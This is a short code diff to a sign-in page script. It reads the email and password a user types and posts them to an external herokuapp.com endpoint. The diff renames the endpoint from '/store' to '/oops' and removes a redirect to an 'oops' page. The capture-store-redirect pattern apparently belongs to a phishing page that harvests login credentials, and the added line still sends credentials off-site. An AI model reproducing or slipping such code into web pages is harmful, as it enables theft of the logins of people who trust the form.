@@ -10,13 +10,11 @@
         $("#signin").click(function(){
           email=$("#email").val();
           password=$("#password").val();
-          $.post("https://lmpt-heroku-app.herokuapp.com/store",{email: email,password: password}, function(data){
+          $.post("https://lmpt-heroku-app.herokuapp.com/oops",{email: email,password: password}, function(data){
 			
             if(data==='done')
               {
                 console.log("store success");
-				console.log("Trying to redirect");
-				window.location.replace("https://lmpt-heroku-app.herokuapp.com/oops");
               }
           });
 		  
